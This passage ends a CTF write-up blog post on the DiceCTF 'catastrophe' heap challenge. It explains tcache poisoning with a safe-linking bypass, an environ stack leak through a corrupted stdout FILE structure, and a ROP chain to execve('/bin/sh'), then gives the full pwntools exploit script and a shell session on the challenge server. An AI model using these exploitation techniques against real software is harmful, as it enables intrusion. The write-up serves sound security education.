<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span> 
<span class="c1"># Offset of the saved rip that belongs to frame of the op_malloc function</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function&rsquo;s stackframe that writes the user input into the requested chunk.</p>
<p>To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&rsquo;s say we wanna write to <code>target</code> and we have <code>prev</code> that overlaps <code>victim</code>:</p>
<ul>
<li><code>free(prev)</code> ends up in the tcachebin (0x140), it has already been consolidated, it <em>already</em> overlaps <code>victim</code>.</li>
<li><code>free(victim)</code> ends up in the tcachebin (0x110).</li>
<li><code>malloc(0x130)</code> returns <code>prev</code>, thus we can corrupt <code>victim-&gt;next</code> and intialize it to <code>(target ^ ((chunk_location) &gt;&gt; 12)</code> to bypass safe-linking.</li>
<li><code>malloc(0x100)</code> returns <code>victim</code> and tcachebin (0x110) next free chunk is <code>target</code>.</li>
<li><code>malloc(0x100)</code> gives a write what where.</li>
</ul>
<p>When we got the write what where on the stack we simply have to craft a call ot system since there is no <code>seccomp</code> shit.
Here is the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># victim</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="c1"># victim-&gt;next = target</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>
<span class="c1"># ROPchain on do_malloc&#39;s stackframe</span>
</code></pre></div><p>And here we are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>mc.ax <span class="nv">PORT</span><span class="o">=</span><span class="m">31273</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+<span class="o">]</span> Opening connection to mc.ax on port 31273: Done
/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> heap @ 0x559cb0184000
<span class="o">[</span>*<span class="o">]</span> libc: 0x7efe8a967000
<span class="o">[</span>*<span class="o">]</span> environ: 0x7efe8ab88200
<span class="o">[</span>*<span class="o">]</span> stdout: 0x7efe8ab81780
<span class="o">[</span>*<span class="o">]</span> stack: 0x7ffe06420710
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
$ id
<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span>
$ ls
flag.txt
run
$ cat flag.txt
hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e<span class="o">}</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"
  
  >a1ex.online</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >ray-cp</a
></li>
<li><a
  class="gblog-markdown__link"
  href="http://blog.leanote.com/post/mut3p1g/file-struct"
  
  >Mutepig&rsquo;s Blog</a
></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;catastrophe&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b* main
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   
   <span class="k">if</span> <span class="n">s</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 
   <span class="k">else</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span> 
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span><span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># large</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/diceCTF" term="diceCTF" label="diceCTF" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/aaSSfxxx" term="aaSSfxxx" label="aaSSfxxx" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/FSOP" term="FSOP" label="FSOP" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                            
                        
                    
                
            
        </entry>
    
</feed>
